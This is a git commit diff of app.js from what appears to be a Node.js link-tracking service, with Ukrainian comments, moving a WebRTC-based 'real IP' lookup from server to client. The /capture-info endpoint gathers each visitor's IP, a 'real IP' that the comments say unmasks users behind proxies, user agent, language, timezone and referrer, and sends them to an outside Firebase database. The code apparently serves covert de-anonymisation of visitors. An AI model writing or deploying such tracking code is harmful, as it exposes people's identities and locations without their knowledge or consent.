8a1a625b75294745e1f25ff5e584edb77197612e
once upon a time <rusnyap@mail.ru>
2023-08-17 09:39:41 +0300

    move webrtc to client

--- app.js
+++ app.js
@@ -46,49 +46,33 @@ const iceConfiguration = {
 };
 
 app.post('/capture-info', async (req, res) => {
-	try {
-	console.log('Received request on /capture-info with data:', req.body);
-    const { timeZone, referrer } = req.body;
-    const ipFromHeaders = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'];
-    const language = req.headers['accept-language'];
-    let dateTime = new Date().toISOString().replace(/[^0-9]/g, "").slice(2,12);
+    try {
+        console.log('Received request on /capture-info with data:', req.body);
 
-    // Створення WebRTC з'єднання
-    const pc = new wrtc.RTCPeerConnection(iceConfiguration);
+        const { timeZone, referrer, clientIP } = req.body;
+        const ipFromHeaders = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+        const userAgent = req.headers['user-agent'];
+        const language = req.headers['accept-language'];
+        let dateTime = new Date().toISOString().replace(/[^0-9]/g, "").slice(2,12);
 
-    pc.onicecandidate = async (event) => {
-		console.log('Received onicecandidate event:', event.candidate);
-        if (event.candidate) {
-            // Якщо це ваш TURN сервер, то отримана IP адреса є реальним IP користувача
-            let match = /relay\sip\s([0-9.]+)/.exec(event.candidate.candidate);
-            if (match) {
-                let realIP = match[1];
-                pc.close(); // Розриваємо з'єднання
+        // Зберігаємо дані в Firebase
+        const response = await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                ip: ipFromHeaders,
+                realip: clientIP, // Використовуємо IP отриманий з клієнтської сторони
+                userAgent: userAgent,
+                language: language,
+                timeZone: timeZone,
+                referrer: referrer
+            }),
+        });
 
-                // Зберігаємо дані в Firebase
-                const response = await fetch('https://storagefortrash-default-rtdb.europe-west1.firebasedatabase.app/relink/' + dateTime + '.json', {
-                    method: 'PUT',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ip: ipFromHeaders,
-						realip: realIP,
-                        userAgent: userAgent,
-                        language: language,
-                        timeZone: timeZone,
-                        referrer: referrer
-                    }),
-                });
-				console.log('Response from Firebase:', await response.text());
-                
-                res.status(200).send('Info captured');
-            }
-        }
-    };
+        console.log('Response from Firebase:', await response.text());
+        res.status(200).send('Info captured');
 
-    pc.createDataChannel(''); 
-    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-	} catch (error) {
+    } catch (error) {
         console.error('Error in /capture-info:', error);
         res.status(500).send('Internal server error');
     }
